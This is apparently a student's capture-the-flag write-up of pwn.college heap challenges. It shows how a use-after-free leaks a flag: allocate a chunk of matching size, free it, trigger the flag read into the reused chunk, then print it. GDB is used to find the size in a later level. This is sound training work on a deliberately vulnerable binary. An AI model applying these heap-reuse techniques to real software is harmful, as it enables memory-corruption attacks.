# Dynamic Allocator Misuse

## level 1.0

[Use-After-Free](https://cwe.mitre.org/data/definitions/416.html) vulnerability

On trying, output says read_flag option mallocs 741 bytes
Malloc a chunk of size 741, free that chunk, now read the flag.. that chunk is reused. Now trying to print the freed chunk will print the flag

```shell
This challenge can manage up to 1 unique allocations.


[*] Function (malloc/free/puts/read_flag/quit): malloc

Size: 741

[*] allocations[0] = malloc(741)
[*] allocations[0] = 0x58b6847bf2c0

[*] Function (malloc/free/puts/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #45     | SIZE: 729 - 744        | COUNT: 1     | HEAD: 0x58b6847bf2c0       | KEY: 0x58b6847bf010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x58b6847bf2c0      | 0                   | 0x2f1 (P)                    | (nil)               | 0x58b6847bf010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/quit): read_flag

[*] flag_buffer = malloc(741)
[*] flag_buffer = 0x58b6847bf2c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{xxxxx}


[*] Function (malloc/free/puts/read_flag/quit): quit

### Goodbye!
```

## level 1.1

Now we don't have the helpful descriptive output

In GDB:

- `b *main+604` (Set a breakpoint at malloc() call when read_flag entered)
- `run` -> Enter "read_flag" -> breakpoint encountered
- `i r` -> rax has value **990**

Replace 741 by 990 in prev solution

## level 2.0

Exactly like level 1.0
